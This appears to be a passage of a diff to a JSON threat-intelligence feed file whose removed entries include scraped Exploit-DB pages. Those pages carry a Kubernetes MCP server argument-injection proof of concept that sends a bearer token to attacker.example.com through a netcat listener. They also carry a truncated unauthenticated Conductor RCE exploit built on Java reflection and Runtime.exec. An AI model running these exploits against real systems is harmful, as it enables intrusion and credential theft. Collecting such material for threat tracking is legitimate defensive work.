(e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description=\"CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection\") parser.add_argument(\"--target\", required=True, help=\"MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)\") parser.add_argument(\"--attacker\", required=True, help=\"Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)\") parser.add_argument(\"--tool\", default=\"kubectl_get\", choices=[\"kubectl_get\", \"kubectl_describe\", \"kubectl_delete\"], help=\"Tool to exploit\") parser.add_argument(\"--namespace\", default=\"default\", help=\"Kubernetes namespace\") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { \"jsonrpc\": \"2.0\", \"method\": \"tools/call\", \"params\": { \"name\": args.tool, \"arguments\": { \"resourceType\": f\"--server={args.attacker}\", \"name\": \"dummy-pod\", \"namespace\": args.namespace, \"output\": \"json\" } }, \"id\": 1 } print(f\"[+] Sending exploit to {args.target} using {args.tool}\") print(f\"[+] Attacker server: {args.attacker}\") print(\"[+] Waiting for token exfiltration...\") try: response = requests.post( args.target, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=10 ) print(f\"[+] Response status: {response.status_code}\") if response.status_code == 200: print(\"[+] Exploit sent successfully. Check your listener for the bearer token!\") else: print(f\"[-] Unexpected response: {response.text[:500]}\") except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>\") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S",
-      "fetch_status": "ok"
+      "full_body": "",
+      "fetch_status": "fetch_failed:HTTPError"
     },
     {
       "source": "Sophos X-Ops",
@@ -5376,36 +5406,6 @@
       "score": 8
     },
     {
-      "source": "CyberScoop",
-      "cohort": "cyber_news_breach_reporting",
-      "category": "cyber_news_breach_reporting",
-      "title": "Why transparent AI agents matter more than you think",
-      "link": "https://cyberscoop.com/transparent-ai-agent-security-op-ed/",
-      "published": "2026-08-10T14:23:16+00:00",
-      "summary": "The difference between a prompt injection attack you'll catch and one you won't might just be whether your AI agent can explain itself. The post Why transparent AI agents matter more than you think appeared first on CyberScoop .",
-      "author": "Greg Otto",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "ai_security"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
-        "confidence_tier": "tier_4_news",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 4
-    },
-    {
       "source": "Check Point Research",
       "cohort": "threat_research_primary",
       "category": "threat_research_primary",
@@ -5877,30 +5877,23 @@
         "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [
-          "GitHub"
-        ],
+        "affected_products": [],
         "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-58138"
-        ],
+        "cve_ids": [],
         "attack_techniques": [],
         "urgency_signals": [
-          "preauth_unauth",
-          "critical_cvss"
+          "preauth_unauth"
         ],
         "content_type": "news_report",
         "confidence_tier": "tier_1_offensive_research",
-        "role_map": {
-          "GitHub": "target"
-        },
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
       },
       "score": 21,
-      "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution EDB-ID: 52633 CVE: 2026-58138 EDB Verified: Author: banyamer Type: webapps Exploit: / Platform: Multiple Date: 2026-08-10 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: OrkesConductor 3.30.2 - Unauthenticated Remote Code Execution # CVE: CVE-2026-58138 # Date: 2026-07-10 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://orkes.io/ # Software Link: https://github.com/conductor-oss/conductor # Affected: Orkes Conductor / Conductor OSS 3.21.21 < 3.30.2 # Tested on: conductoross/conductor:3.22.3 # Category: Remote Code Execution # Platform: Linux # Exploit Type: Unauthenticated RCE # CVSS: 9.8 # Description: Unauthenticated remote code execution by submitting malicious INLINE JavaScript tasks that abuse unsandboxed GraalVM HostAccess.ALL for Java reflection and Runtime.exec. # Fixed in: 3.30.2 # Usage: # python3 exploit.py <target> [-c CMD] # # Examples: # python3 exploit.py http://127.0.0.1:8080 # python3 exploit.py http://target:8080 -c \"whoami; id; cat /etc/passwd\" # # Options: # target Conductor API base URL (e.g. http://127.0.0.1:8080) # -c, --cmd Command to execute (default: id; hostname) # # Notes: # • Requires no authentication (default community API behavior). # • Runs as the Conductor process user (often root in Docker). # • Pure Python stdlib - no extra dependencies. import argparse import json import sys import time import urllib.request def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") def js_rce(cmd): c = cmd.replace(\"\\\\\", \"\\\\\\\\\").replace(\"'\", \"\\\\'\") return ( \"var k=$.getClass().getClass();\" \"var S=k.getMethod('getName').getReturnType();\" \"var forName=k.getMethod('forName',S);\" \"var L=function(n){return forName.invoke(null,[n]);};\" \"var RT=L('java.lang.Runtime');\" \"var rt=RT.getMethod('getRuntime').invoke(null,[]);\" \"var I=L('java.lang.Integer').getField('TYPE').get(null);\" \"var A=L('java.lang.reflect.Array');\" \"var arr=A.getMethod('newInstance',k,I).invoke(null,[S,3]);\" \"var set=A.getMethod('set',L('java.lang.Object'),I,L('java.lang.Object'));\" f\"set.invoke(null,[arr,0,'sh']);set.invoke(null,[arr,1,'-c']);set.invoke(null,[arr,2,'{c}']);\" \"var p=RT.getMethod('exec',arr.getClass()).invoke(rt,[arr]);p.waitFor();\" \"var isr=L('java.io.InputStreamReader').getConstructor(L('java.io.InputStream')).newInstance(p.getInputStream());\" \"var br=L('java.io.BufferedReader').getConstructor(L('java.io.Reader')).newInstance(isr);\" \"var o='',l;while((l=br.readLine())!==null)o+=l+'\\\\n';o\" ) def call(base, path, data=None, method=None): url = base.rstrip(\"/\") + path body = json.dumps(data).encode() if data is not None else None req = urllib.request.Request( url, data=body, method=method or (\"POST\" if data is not None else \"GET\"), headers={\"Content-Type\": \"application/json\", \"Accept\": \"application/json,text/plain,*/*\"} ) with urllib.request.urlopen(req, timeout=30) as r: raw = r.read().decode() try: return r.status, json.loads(raw) except Exception: return r.status, raw def main(): banner() ap = argparse.ArgumentParser(description=\"CVE-2026-58138 Conductor unauth RCE\") ap.add_argument(\"target\", help=\"Conductor API base, e.g. http://127.0.0.1:8080\") ap.add_argument(\"-c\", \"--cmd\", default=\"id; hostname\", help=\"command to run on the Conductor host\") args = ap.parse_args() wf = \"pwn_\" + str(int(time",
-      "fetch_status": "ok"
+      "full_body": "",
+      "fetch_status": "fetch_failed:HTTPError"
     },
     {
       "source": "Exploit-DB",
@@ -8487,6 +8480,33 @@
         }
       },
       "score": 7
+    },
+    {
+      "source": "Microsoft Security Blog",
+      "cohort": "threat_research_primary",
+      "category": "threat_research_primary",
+      "title": "​​Microsoft named a Leader in the KuppingerCole Leadership Compass for Cloud Native Application Protection Platforms (CNAPP)",
+      "link": "https://www.microsoft.com/en-us/security/blog/2026/08/05/microsoft-named-a-leader-in-the-kuppingercole-leadership-compass-for-cloud-native-application-protection-platforms-cnapp/",
+      "published": "2026-08-05T16:30:00+00:00",
+      "summary": "Learn why KuppingerCole named Microsoft a Leader in its Leadership Compass: Cloud Native Application Protection Platforms report. The post ​​Microsoft named a Leader in the KuppingerCole Leadership Compass for Cloud Native Application Protection Platforms (CNAPP) appeared first on Microsoft Security Blog .",
+      "author": "Ran Rosin",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_1_primary_research",
+        "role_map": {},
+        "weak_tags": {
+          "products": []
+        }
+      }
     },
     {
       "source": "Microsoft Security Blog",
